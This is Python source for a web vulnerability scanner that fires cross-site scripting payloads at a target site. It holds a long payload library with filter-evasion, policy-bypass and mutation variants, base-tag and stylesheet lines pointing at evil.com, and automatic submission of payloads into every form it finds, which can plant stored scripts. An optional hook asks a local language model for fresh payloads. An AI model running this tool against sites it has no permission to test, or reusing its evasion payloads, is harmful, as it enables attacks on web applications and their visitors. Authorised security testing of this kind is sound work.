import requests
import re
import hashlib
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse, quote
from utils.output import section, info, success, warning, error, result
from utils.ollama_helper import OllamaHelper

try:
    import bs4
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

CONTEXT_PAYLOADS = {
    "html": [
        ("<script>alert(1)</script>", "Basic script tag"),
        ("<img src=x onerror=alert(1)>", "Img onerror"),
        ("<svg onload=alert(1)>", "SVG onload"),
        ("<body onload=alert(1)>", "Body onload"),
        ("<video src=x onerror=alert(1)>", "Video onerror"),
        ("<audio src=x onerror=alert(1)>", "Audio onerror"),
        ("<details open ontoggle=alert(1)>", "Details ontoggle"),
        ("<marquee onstart=alert(1)>", "Marquee onstart"),
        ("<input autofocus onfocus=alert(1)>", "Input autofocus"),
        ("<select autofocus onfocus=alert(1)>", "Select autofocus"),
        ("<keygen autofocus onfocus=alert(1)>", "Keygen autofocus"),
        ("<iframe srcdoc='<script>alert(1)<\\/script>'></iframe>", "Iframe srcdoc"),
        ("<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>", "MathML mXSS"),
        ("<div><div><style><!--</style><div><script>alert(1)</script>", "Style comment break"),
        ("<![><script>alert(1)</script>", "CDATA break"),
        ("<?xml><script>alert(1)</script>", "XML processing"),
    ],
    "attribute": [
        ("\" onmouseover=alert(1) x=\"", "Double quote break"),
        ("' onmouseover=alert(1) x='", "Single quote break"),
        ("\" autofocus onfocus=alert(1) x=\"", "Autofocus attr"),
        ("\" onfocus=alert(1) autofocus x=\"", "Autofocus alt order"),
        ("\" onfocus=alert(1) id=x \"", "Space break"),
        ("javascript:alert(1)", "JS pseudo attr"),
        ("javascript:alert(1)//", "JS pseudo comment"),
        ("\" onclick=alert(1) \"", "Click handler"),
        ("\" onload=alert(1) \"", "Load handler"),
        ("\" onerror=alert(1) \"", "Error handler"),
        ("\" onsubmit=alert(1) \"", "Submit handler"),
        ("\" onreset=alert(1) \"", "Reset handler"),
        ("\" onchange=alert(1) \"", "Change handler"),
        ("\" onblur=alert(1) \"", "Blur handler"),
        ("\" oncut=alert(1) \"", "Cut handler"),
        ("\" oncopy=alert(1) \"", "Copy handler"),
        ("\" onpaste=alert(1) \"", "Paste handler"),
        ("\" oninput=alert(1) \"", "Input handler"),
    ],
    "url": [
        ("javascript:alert(1)", "Javascript pseudo"),
        ("javascript:alert(1)//", "JS pseudo comment"),
        ("jav&#x09;ascript:alert(1)", "Tab encoded"),
        ("jav&#x0A;ascript:alert(1)", "Newline encoded"),
        ("jav&#x0D;ascript:alert(1)", "CR encoded"),
        ("java script:alert(1)", "Space JS"),
        (" javascript:alert(1)", "Leading space"),
        ("JaVaScRiPt:alert(1)", "Case mix"),
        ("\x00javascript:alert(1)", "Null byte prefix"),
        ("%6Aavascript:alert(1)", "URL encoded prefix"),
        ("&#106;&#97;vascript:alert(1)", "HTML entity encode"),
        ("vbscript:msgbox(1)", "VBScript"),
        ("data:text/html,<script>alert(1)</script>", "Data URI script"),
        ("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", "Data URI base64"),
    ],
    "script": [
        ("';alert(1)//", "Single quote break"),
        ("\";alert(1)//", "Double quote break"),
        ("</script><script>alert(1)</script>", "Script close/open"),
        ("</ScRiPt><ScRiPt>alert(1)</ScRiPt>", "Case mix close/open"),
        ("'-alert(1)-'", "Expression break"),
        ("\"-alert(1)-\"", "Expression break dq"),
        ("`-alert(1)-`", "Template literal"),
        ("1;alert(1)//", "Semicolon inject"),
        ("1});alert(1);//", "Close function"),
        ("1]};alert(1);//", "Close multi"),
        ("1]}});alert(1);//", "Close deep"),
        ("${alert(1)}", "Template injection"),
        ("${7*7}", "Template math"),
    ],
    "polyglot": [
        ("\" onmouseover=alert(1) autofocus=\">'><script>alert(1)</script>", "Polyglot attr+html"),
        ("javascript:/*--></title></style></textarea></script><svg onload=alert(1)>", "Polyglot all context"),
        ("\")';alert(1)//<script>alert(1)</script>", "Polyglot script+html"),
        ("\"><script>alert(1)</script>", "Polyglot attr close+script"),
        ("'><script>alert(1)</script>", "Polyglot single attr+script"),
        ("\"/><script>alert(1)</script>", "Self-close + script"),
        ("\"><img src=x onerror=alert(1)>", "Attr close + img"),
    ],
    "waf_bypass": [
        ("<scr<script>ipt>alert(1)</scr<script>ipt>", "Redundant tag"),
        ("<script>eval(atob('YWxlcnQoMSk='))</script>", "Base64 eval"),
        ("<script>\\u0061lert(1)</script>", "Unicode escape"),
        ("<img src=x onerror=\u0061lert(1)>", "Unicode in event"),
        ("<img src=x oneRror=alert(1)>", "Case mix event"),
        ("<ScRiPt>alert(1)</ScRiPt>", "Tag case mix"),
        ("<svg/onload=alert(1)>", "Self-close SVG"),
        ("<svg onload%20=alert(1)>", "Space encoded"),
        ("<img src=x%20onerror=alert(1)>", "Space in tag"),
        ("<img src=x onerror=alert(1) <!--", "HTML comment trap"),
        ("<SCRIPT>alert(1)</SCRIPT>", "Uppercase script"),
        ("<script>alert(1)</script>", "Standard"),
        ("<script>\r\nalert(1)\r\n</script>", "Newlines in script"),
        ("<scr\x00ipt>alert(1)</scr\x00ipt>", "Null byte injection"),
        ("<scr\x00ipt>alert(1)</scr\x00ipt>", "Null byte in tag"),
        ("<img src=\"x\"\" onerror=alert(1)>", "Double quote attr"),
        ("<img src=x onerror=alert(1) onerror=alert(2)>", "Duplicate events"),
        ("<img src=x onerror=alert(1)//", "Comment after event"),
        ("<img src=x onerror=alert(1) ", "Trailing space"),
        ("<img src=x onerror=alert(1)/", "Self close"),
        ("<img src=x onerror=alert(1)>x", "With trailing char"),
        ("<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>", "HTML entity event"),
        ("<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>", "Hex entity event"),
        ("<img src=x onerror=alert(String.fromCharCode(49))>", "Char code bypass"),
        ("<img src=x onerror=this.alert(1)>", "this. bypass"),
        ("<img src=x onerror=window.alert(1)>", "window. bypass"),
        ("<img src=x onerror=top.alert(1)>", "top. bypass"),
        ("<img src=x onerror=self.alert(1)>", "self. bypass"),
        ("<img src=x onerror=parent.alert(1)>", "parent. bypass"),
        ("<img src=x onerror=eval(\"alert(1)\")>", "Eval wrapper"),
        ("<img src=x onerror=Function('alert(1)')()>", "Function constructor"),
        ("<img src=x onerror=setTimeout('alert(1)')>", "SetTimeout wrapper"),
        ("<img src=x onerror=setInterval('alert(1)')>", "SetInterval wrapper"),
        ("<details open ontoggle=alert(1)>", "Details event"),
        ("<body onload=alert(1)>", "Body load"),
        ("<iframe onload=alert(1)>", "Iframe load"),
        ("<img src=x onerror=alert(1) ", "Trim end"),
        ("\";alert(1);\"", "Script break"),
        ("'+alert(1)+'", "Script + break"),
        ("</script><script>alert(1)</script>", "Close/reopen script"),
        ("--></script><script>alert(1)</script>", "HTML comment close"),
        ("</TITLE></STYLE></SCRIPT><svg onload=alert(1)>", "Close all + svg"),
    ],
    "dom_based": [
        ("#<script>alert(1)</script>", "Hash fragment"),
        ("?<script>alert(1)</script>", "Query param"),
        ("#<img src=x onerror=alert(1)>", "Hash img"),
        ("javascript:alert(1)//xss", "Hash JS"),
        ("\" onerror=alert(1) \"", "Hash error"),
    ],
    "csp_bypass": [
        ("<script src='https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.js'></script>", "Angular CDN"),
        ("<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>", "InnerHTML inject"),
        ("<base href='https://evil.com'>", "Base tag redirect"),
        ("<link rel=stylesheet href='https://evil.com/exploit.css'>", "CSS injection"),
        ("<form action='javascript:alert(1)'><input type=submit></form>", "Form JS action"),
        ("<iframe src='javascript:alert(1)'></iframe>", "Iframe JS src"),
        ("<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>", "Meta refresh JS"),
        ("<object data='javascript:alert(1)'></object>", "Object data JS"),
        ("<embed src='javascript:alert(1)'></embed>", "Embed JS"),
        ("<script>new Function('alert(1)')()</script>", "Function constructor"),
        ("<script>eval.call(this,'alert(1)')</script>", "Eval call"),
        ("<script>setTimeout('alert(1)')</script>", "SetTimeout str"),
        ("<script>setInterval('alert(1)')</script>", "SetInterval str"),
    ],
    "mutation_xss": [
        ("<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">", "Noscript mXSS"),
        ("<select><style></select><img src=x onerror=alert(1)></style>", "Select mXSS"),
        ("<listing><style></listing><img src=x onerror=alert(1)>", "Listing mXSS"),
        ("<div><style><!--</style><div><script>alert(1)</script>", "Style comment mXSS"),
        ("<xmp><style></xmp><img src=x onerror=alert(1)>", "XMP mXSS"),
        ("<svg><p><style><p></style><img src=x onerror=alert(1)>", "SVG style mXSS"),
    ],
}

CSP_DIRECTIVES = [
    "default-src", "script-src", "style-src", "img-src",
    "connect-src", "frame-src", "object-src", "base-uri",
]

DOM_SINKS = [
    r"document\.write\s*\(", r"document\.writeln\s*\(",
    r"\.innerHTML\s*=", r"\.outerHTML\s*=",
    r"\.insertAdjacentHTML\s*\(",
    r"eval\s*\(", r"setTimeout\s*\(\s*['\"]", r"setInterval\s*\(\s*['\"]",
    r"new Function\s*\(", r"\.location\s*=", r"location\.href\s*=",
    r"location\.assign\s*\(", r"location\.replace\s*\(",
    r"\.src\s*=", r"srcdoc\s*=",
    r"jQuery\.html\s*\(", r"\$\.html\s*\(", r"\$\(.*\)\.html\s*\(",
    r"jQuery\.append\s*\(", r"\$\.append\s*\(", r"\$\(.*\)\.append\s*\(",
    r"\.appendChild\s*\(", r"\.replaceChild\s*\(",
    r"\.setAttribute\s*\(\s*['\"](on|srcdoc)", r"\.createContextualFragment\s*\(",
    r"\.parseFromString\s*\(", r"DOMParser",
    r"\.responseText", r"\.responseXML",
    r"postMessage\s*\(", r"onmessage\s*=",
    r"window\.name", r"name\s*=",
]

DANGEROUS_SOURCES = [
    r"location\s*(\.|\[)", r"document\s*\.\s*URL",
    r"document\s*\.\s*documentURI", r"document\s*\.\s*baseURI",
    r"document\s*\.\s*cookie", r"document\s*\.\s*referrer",
    r"window\s*\.\s*name", r"history\s*\.\s*(pushState|replaceState)",
    r"localStorage", r"sessionStorage",
    r"indexedDB", r"postMessage",
]


class AdvancedXSSScanner:
    name = "xss"
    description = "Advanced XSS scanner (context-aware, polyglots, WAF bypass, DOM-based, mXSS, CSP analysis)"

    @staticmethod
    def run(target, timeout=10, ollama_model=None):
        section(f"Advanced XSS Scanner: {target}")

        ollama = OllamaHelper(model=ollama_model) if ollama_model else None

        if not target.startswith(("http://", "https://")):
            target = f"https://{target}"

        parsed = urlparse(target)
        params = parse_qs(parsed.query)
        all_results = {"reflected": [], "dom": [], "csp": [], "stored": [], "mutation": []}
        response_headers = {}
        response_body = ""

        try:
            resp = requests.get(target, timeout=timeout,
                headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"})
            response_headers = dict(resp.headers)
            response_body = resp.text
        except Exception as e:
            error(f"Failed to fetch target: {e}")
            return {"target": target, "results": all_results}

        section("Phase 1: CSP Analysis")
        csp = response_headers.get("Content-Security-Policy", "")
        csp_report = response_headers.get("Content-Security-Policy-Report-Only", "")
        if csp:
            info(f"Content-Security-Policy: {csp[:150]}...")
            all_results["csp"].append({"header": "Content-Security-Policy", "value": csp})
            for directive in CSP_DIRECTIVES:
                match = re.search(rf"{directive}\s+(.+?)(?:;|$)", csp, re.I)
                if match:
                    value = match.group(1).strip()
                    if "'unsafe-inline'" in value:
                        warning(f"  {directive}: {value[:80]} -> UNSAFE-INLINE")
                    elif "'unsafe-eval'" in value:
                        warning(f"  {directive}: {value[:80]} -> UNSAFE-EVAL")
                    elif "*" in value.split():
                        warning(f"  {directive}: {value[:80]} -> WILDCARD")
                    else:
                        info(f"  {directive}: {value[:80]}")
        else:
            warning("  No Content-Security-Policy header found")

        if csp_report:
            info(f"CSP-Report-Only: {csp_report[:100]}...")
            all_results["csp"].append({"header": "Content-Security-Policy-Report-Only", "value": csp_report})

        if ollama and ollama.available:
            section("Phase 0: Ollama Custom XSS Payloads")
            csp = response_headers.get("Content-Security-Policy", "")
            ai_payloads = ollama.generate_xss_payloads("parameter context", csp)
            if ai_payloads:
                info(f"Ollama generated {len(ai_payloads)} custom XSS payloads")
                if params:
                    for param in params:
                        for payload in ai_payloads[:10]:
                            try:
                                test_params = {k: v[0] for k, v in params.items()}
                                test_params[param] = payload
                                qs = urlencode(test_params)
                                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, qs, parsed.fragment))
                                resp2 = requests.get(test_url, timeout=timeout,
                                    headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"})
                                AdvancedXSSScanner.check_reflection(resp2.text, payload, param, "Ollama AI", "ollama", all_results)
                            except:
                                pass

        section("Phase 2: Reflected XSS - Parameter Testing")
        if params:
            for param in params:
                info(f"Testing param: {param}")
                baseline_body = response_body

                for context_name, payloads in CONTEXT_PAYLOADS.items():
                    for payload, payload_name in payloads:
                        try:
                            test_params = {k: v[0] for k, v in params.items()}
                            test_params[param] = payload
                            qs = urlencode(test_params)
                            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, qs, parsed.fragment))

                            resp2 = requests.get(test_url, timeout=timeout,
                                headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"})

                            AdvancedXSSScanner.check_reflection(resp2.text, payload, param, payload_name, context_name, all_results)

                        except Exception as e:
                            error(f"[{param}] [{payload_name}] Error: {e}")
        else:
            info("No URL parameters found")
            info("Attempting parameter discovery on common XSS params...")
            xss_params = ["q", "s", "search", "query", "id", "page", "p", "keyword", "term",
                          "name", "user", "text", "msg", "message", "comment", "content",
                          "url", "link", "redirect", "file", "path", "page", "lang", "sort",
                          "order", "filter", "category", "tag", "type", "view", "ref", "src"]
            for p in xss_params:
                test_url = f"{target.rstrip('/')}?{p}=<script>alert(1)</script>"
                try:
                    resp2 = requests.get(test_url, timeout=timeout,
                        headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"})
                    AdvancedXSSScanner.check_reflection(resp2.text, "<script>alert(1)</script>", p, "discovered param", "html", all_results)
                except:
                    pass

        section("Phase 3: DOM-Based XSS Analysis")
        dom_findings = []
        for sink_pattern in DOM_SINKS:
            matches = re.finditer(sink_pattern, response_body, re.I)
            for match in matches:
                start = max(0, match.start() - 50)
                end = min(len(response_body), match.end() + 50)
                context = response_body[start:end]
                source_match = None
                for source_pattern in DANGEROUS_SOURCES:
                    src_match = re.search(source_pattern, context, re.I)
                    if src_match:
                        source_match = src_match.group()
                        break
                if source_match:
                    warning(f"  DOM XSS sink -> {match.group()} (source: {source_match})")
                    dom_findings.append({"sink": match.group(), "source": source_match, "context": context[:100]})
                    all_results["dom"].append({"sink": match.group(), "source": source_match, "type": "sink+source"})
                else:
                    info(f"  Sink: {match.group()} (no source in nearby context)")
                    dom_findings.append({"sink": match.group(), "source": None, "context": context[:100]})

        inline_scripts = re.findall(r'<script[^>]*>(.*?)</script>', response_body, re.I | re.S)
        for script in inline_scripts:
            for sink_pattern in DOM_SINKS:
                if re.search(sink_pattern, script, re.I):
                    for source_pattern in DANGEROUS_SOURCES:
                        if re.search(source_pattern, script, re.I):
                            sink_match = re.search(sink_pattern, script, re.I)
                            source_match = re.search(source_pattern, script, re.I)
                            warning(f"  DOM XSS in inline script: {sink_match.group()} + {source_match.group()}")
                            all_results["dom"].append({"sink": sink_match.group(), "source": source_match.group(), "type": "inline_script"})
                            break

        section("Phase 4: Stored XSS - Form Testing")
        if HAS_BS4:
            soup = bs4.BeautifulSoup(response_body, "html.parser")
            forms = soup.find_all("form")
            info(f"Found {len(forms)} form(s) for potential stored XSS testing")

            for form in forms:
                action = form.get("action", "")
                method = form.get("method", "get").lower()
                inputs = [inp.get("name") for inp in form.find_all("input") if inp.get("name")]
                textareas = [ta.get("name") for ta in form.find_all("textarea") if ta.get("name")]
                all_inputs = inputs + textareas
                if not all_inputs:
                    continue
                action_url = urljoin(target, action)

                for context_name, payloads in list(CONTEXT_PAYLOADS.items())[:5]:
                    for payload, payload_name in payloads[:3]:
                        try:
                            form_data = {inp: payload for inp in all_inputs}
                            if method == "post":
                                resp2 = requests.post(action_url, data=form_data, timeout=timeout,
                                    headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"})
                            else:
                                resp2 = requests.get(action_url, params=form_data, timeout=timeout,
                                    headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"})

                            if any(pattern in resp2.text for pattern in ["<script>alert", "onerror=alert", "onload=alert"]):
                                warning(f"[stored:{action_url}] [{payload_name}] Payload stored and executed!")
                                all_results["stored"].append({
                                    "url": action_url, "payload": payload, "payload_name": payload_name,
                                    "form_inputs": all_inputs,
                                })
                            else:
                                info(f"[stored:{action_url}] [{payload_name}] Submitted (check manually)")
                        except Exception as e:
                            pass
        else:
            info("Install beautifulsoup4 for form-based stored XSS testing")

        section("XSS Scan Results Summary")
        total_reflected = len(all_results["reflected"])
        total_dom = len(all_results["dom"])
        total_stored = len(all_results["stored"])
        total_mutation = len(all_results["mutation"])

        findings_report = []
        if total_reflected:
            warning(f"Reflected XSS: {total_reflected} potential finding(s)")
            for r in all_results["reflected"][:10]:
                result(f"  [{r['param']}] [{r['context']}]", f"{r['payload_name']}: reflected in response")
        if total_dom:
            warning(f"DOM-Based XSS: {total_dom} potential sink+source pair(s)")
            for d in all_results["dom"][:5]:
                result(f"  [{d['type']}]", f"Sink: {d['sink']} | Source: {d.get('source', '?')}")
        if total_stored:
            warning(f"Stored XSS: {total_stored} submission(s) attempted")
        if not all_results["csp"]:
            warning("No CSP header — no protection against XSS")
        if total_reflected == 0 and total_dom == 0:
            success("No obvious XSS vulnerabilities detected")
            info("Manual testing with browser DevTools is recommended for DOM-based XSS")

        return {
            "target": target,
            "results": all_results,
            "totals": {
                "reflected": total_reflected,
                "dom": total_dom,
                "stored": total_stored,
                "csp": bool(csp),
            }
        }

    @staticmethod
    def check_reflection(body, payload, param, payload_name, context, all_results):
        payload_clean = payload.strip().rstrip("/")
        patterns = [
            payload_clean,
            payload_clean.replace("'", "&#39;").replace("\"", "&quot;").replace("<", "&lt;").replace(">", "&gt;"),
            quote(payload_clean),
            quote(payload_clean, safe=''),
            re.escape(payload_clean.replace("\"", "&quot;")),
        ]
        for pattern in patterns:
            try:
                if isinstance(pattern, str) and pattern in body:
                    warning(f"[{param}] [{context}:{payload_name}] Payload REFLECTED!")
                    all_results["reflected"].append({
                        "param": param, "payload": payload, "payload_name": payload_name, "context": context,
                        "reflected_in": "response_body",
                    })
                    return
            except:
                pass

        payload_injected = payload.replace("<", "&lt;").replace(">", "&gt;")
        if payload_injected != payload and payload_injected in body:
            info(f"[{param}] [{context}:{payload_name}] Payload reflected (HTML-encoded) - may not be exploitable")

        if len(payload) >= 4 and payload[:4] in body:
            info(f"[{param}] [{context}:{payload_name}] Partial reflection: '{payload[:4]}...' found")
